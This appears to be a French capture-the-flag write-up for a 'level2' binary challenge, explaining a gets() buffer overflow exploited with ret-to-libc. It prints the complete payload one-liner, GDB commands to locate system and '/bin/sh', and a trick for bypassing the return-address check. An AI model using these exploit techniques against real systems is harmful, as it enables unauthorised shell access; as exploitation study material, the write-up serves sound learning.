# Soluce

```
(python -c 'print("a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "----" + "\x58\xcc\xf8\xb7")'; cat) | ./level2
```

## Description du code

-  la fonction p est appeler dans le main
-  une faille evidente est dans p un gets qui utilise une chaine de 76 char
-  cependant condition check si l'adresse de retour est modifier afin de proteger a toute modifiction

## Explication de l'exploit

Pour exploiter la vulnérabilité de débordement de tampon (buffer overflow) introduite par gets, nous utiliserons une technique appelée "ret to libc".
Dans un premier temps, nous allons analyser le binaire à l'aide de l'outil Ghidra pour obtenir le code source. Ensuite, nous utiliserons un motif d'exploitation pour déterminer le décalage de l'adresse de retour.

Le motif d'exploitation est :

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

En utilisant l'extension PEDA de GDB, nous pouvons observer que le contenu de eip est "6Ac7", ce qui signifie que le décalage pour écrire sur eip est de 80.
Ensuite, nous récupérons l'adresse de la fonction system et l'adresse de la chaîne "/bin/sh" depuis le binaire à l'aide de GDB.

```
gdb ./level2
b main
run 

p &system
$1 = (<text variable, no debug info> *) 0xb7e6b060 <system>           ## Adresse de system

find &system,+9999999,"/bin/sh"                                         
0xb7f8cc58                                                             ## Adresse de la chaîne "/bin/sh"
```

Maintenant, nous assemblons ces informations pour former la charge utile correcte sur la pile :

```
(python -c 'print("a" * 80  + "\x60\xb0\xe6\xb7" + "----" + "\x58\xcc\xf8\xb7")'; cat) | ./level2
```
Nous pouvons remplacer les "----" par l'adresse de exit, qui sera l'adresse de retour de system. 

Cependant, le code a une protection qui vérifie si l'adresse de retour est modifiée. Pour contourner cela, nous inserons la meme adresse de retour pour faire en sorte de passer la verification

```
(gdb) disassemble p
(...)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret  
```
## Payload

[Padding de 80] + [Adresse de reour de p] + [Adresse de system] + [Adresse de retour de system] + [Adresse de la string /bin/sh]

tips: l'adresse de retour de system, peut etre n'importe quelle string, en general